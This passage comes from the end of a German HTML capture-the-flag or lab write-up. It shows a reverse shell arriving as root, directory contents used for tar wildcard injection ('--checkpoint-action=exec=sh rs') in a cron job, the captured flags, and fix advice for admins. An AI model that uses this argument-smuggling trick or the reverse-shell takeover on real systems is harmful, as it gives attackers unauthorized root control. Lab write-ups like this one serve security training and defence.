+                <strong>Bewertung (Schritt 3):</strong> Erfolg! Der Listener zeigt eine eingehende Verbindung von der IP des Ziels (`192.168.2.112`) an. Der Angreifer hat nun eine interaktive Shell auf dem Zielsystem. Der Befehl `id` bestätigt, dass die Shell mit `uid=0(root)` läuft. Fantastisch, der Root-Zugriff war erfolgreich! Nun ist das Ziel erreicht. Die Befehle `ls`, `cd /root` und `cat root.txt` werden ausgeführt, um den Root-Zugriff weiter zu bestätigen und die Root-Flag auszulesen.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. mit Python PTY oder `socat`), sammeln Sie die Root-Flag und dokumentieren Sie den Pfad zur Rechteausweitung. Führen Sie weitere Post-Exploitation-Schritte durch, falls erforderlich (z.B. Suche nach weiteren sensiblen Daten, Persistenzmechanismen prüfen).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Stoppen Sie den Cronjob sofort (`/etc/init.d/cron stop` oder `systemctl stop cron`). Bereinigen Sie das `/opt/secret`-Verzeichnis. Korrigieren Sie die unsichere `tar`-Verwendung im Cronjob wie zuvor empfohlen. Überprüfen Sie das System auf weitere Anzeichen einer Kompromittierung oder Persistenzmechanismen, die der Angreifer möglicherweise hinterlassen hat. Ändern Sie alle Passwörter, insbesondere das Root-Passwort.
+             </p>
+             <p class="evaluation">
+                 <strong>Risikobewertung:</strong> Die Schwachstelle ermöglichte einem niedrig privilegierten Benutzer (`po` -> `oogway`) die vollständige Übernahme des Systems mit Root-Rechten. Das Risiko ist **kritisch**, da ein Angreifer beliebige Befehle ausführen, Daten stehlen oder manipulieren, Malware installieren und das System vollständig kontrollieren kann.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Fortsetzung der Listener-Ausgabe -->
+                    <pre>connect to [192.168.2.153] from (UNKNOWN) [192.168.2.112] 41662</pre>
+                     <!-- Nun folgen Befehle, die in der empfangenen Root-Shell ausgeführt werden -->
+                     <div class="prompt no-kali-prompt"> # <span class="command">id</span></div>
+                     <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                     <div class="prompt no-kali-prompt"> # <span class="command">ls</span></div>
+                     <pre>--checkpoint=1
+--checkpoint-action=exec=sh rs
+rs</pre>
+                     <div class="prompt no-kali-prompt"> # <span class="command">cd /root</span></div>
+                     <div class="prompt no-kali-prompt"> # <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">d5806296126a30ceebeaa172ff9c9151</span></pre>
+                </div>
+            </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/oogway/user.txt</div>
+                     <div class="flag-value"><span class="password">081ecc5e6dd6ba0d150fc4bc0e62ec50</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">d5806296126a30ceebeaa172ff9c9151</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-10-25</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
